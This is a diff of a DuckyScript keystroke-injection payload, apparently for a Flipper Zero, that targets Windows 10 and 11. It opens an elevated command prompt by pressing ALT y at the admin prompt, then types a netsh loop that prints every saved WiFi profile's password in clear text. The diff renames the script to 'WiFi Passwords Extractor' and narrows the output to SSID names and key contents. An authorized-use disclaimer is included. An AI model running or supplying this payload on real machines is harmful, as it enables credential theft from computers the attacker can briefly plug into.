@@ -1,6 +1,7 @@
-REM Title: Windows Wifi Password lister
+REM Title: WiFi Passwords Extractor
 REM Author David G.
 REM Target: Windows 10 and 11
+REM Original: https://github.com/dgodibadze/flipperzero/blob/153825f6b86546cb2e46a77e292a4932c5b22904/list_win_wifi_pass.txt
 REM THIS IS FOR AUTHORIZED USE ON MACHINES YOU EITHER OWN OR HAVE BEEN GIVEN ACCESS TO PEN TEST, DAVID G. IS NOT LIABLE FOR ANY MISUSE OF THIS SCRIPT
 REM -- set default delay
 DEFAULT_DELAY 350
@@ -13,5 +14,5 @@ DELAY 600
 REM ----- pick the "yes" button
 ALT y
 REM ----- list wifi passwords
-STRING for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear
+STRING for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | netsh wlan show profiles %j key=clear | findstr /C:"SSID name" /C:"Key Content"
 ENTER
